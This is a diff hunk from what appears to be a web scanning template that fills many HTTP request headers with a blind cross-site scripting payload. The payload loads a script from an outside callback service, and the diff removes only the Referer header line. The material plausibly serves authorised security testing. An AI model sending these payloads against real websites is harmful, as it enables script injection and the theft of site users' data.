@@ -99,7 +99,6 @@ requests:
       Proxy-Url: "ORCanary12345.comOR'&#8211;><script src=https://xss.report/c/hnterx></script>"
       Real-Ip: "ORCanary12345.comOR'&#8211;><script src=https://xss.report/c/hnterx></script>"
       Redirect: "ORCanary12345.comOR'&#8211;><script src=https://xss.report/c/hnterx></script>"
-      Referer: "ORCanary12345.comOR'&#8211;><script src=https://xss.report/c/hnterx></script>"
       Referrer: "ORCanary12345.comOR'&#8211;><script src=https://xss.report/c/hnterx></script>"
       Refferer: "ORCanary12345.comOR'&#8211;><script src=https://xss.report/c/hnterx></script>"
       Request-Uri: "ORCanary12345.comOR'&#8211;><script src=https://xss.report/c/hnterx></script>"
